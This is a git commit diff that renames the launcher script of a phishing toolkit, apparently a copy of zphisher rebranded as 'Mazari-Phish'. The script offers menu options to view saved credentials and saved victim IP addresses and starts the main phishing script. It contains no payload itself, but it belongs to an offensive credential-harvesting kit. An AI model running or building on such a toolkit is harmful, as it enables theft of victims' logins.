0700e6a027d21e1afa11c218d11ada929273e915
Mazari Tech <fahadalimazaripc@gmail.com>
2025-08-05 17:22:43 +0500

    Initial commit with updated Docker and script changes

--- mazari-phish/scripts/launch.sh
+++ mazari-phish/scripts/launch.sh
@@ -1,32 +1,32 @@
 #!/bin/bash
 
-# https://github.com/htr-tech/zphisher
+# https://github.com/MAZARITECH/Mazari-Phising-Tool
 
-if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
+if [[ $(uname -o) == *'Android'* ]]; then
+    MAZARI_ROOT="/data/data/com.termux/files/usr/opt/mazari-phish"
 else
-	export ZPHISHER_ROOT="/opt/zphisher"
+    export MAZARI_ROOT="/opt/mazari-phish"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
-	echo "To run Zphisher type \`zphisher\` in your cmd"
-	echo
-	echo "Help:"
-	echo " -h | help : Print this menu & Exit"
-	echo " -c | auth : View Saved Credentials"
-	echo " -i | ip   : View Saved Victim IP"
-	echo
+    echo "To run Mazari-Phish, type \`mazari-phish\` in your terminal"
+    echo
+    echo "Help:"
+    echo " -h | help : Print this menu & Exit"
+    echo " -c | auth : View Saved Credentials"
+    echo " -i | ip   : View Saved Victim IP"
+    echo
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
-		echo "No Credentials Found !"
-		exit 1
-	}
+    cat $MAZARI_ROOT/auth/usernames.dat 2> /dev/null || { 
+        echo "No Credentials Found !"
+        exit 1
+    }
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
-		echo "No Saved IP Found !"
-		exit 1
-	}
+    cat $MAZARI_ROOT/auth/ip.txt 2> /dev/null || {
+        echo "No Saved IP Found !"
+        exit 1
+    }
 else
-	cd $ZPHISHER_ROOT
-	bash ./zphisher.sh
+    cd $MAZARI_ROOT
+    bash ./mazari-phish.sh
 fi
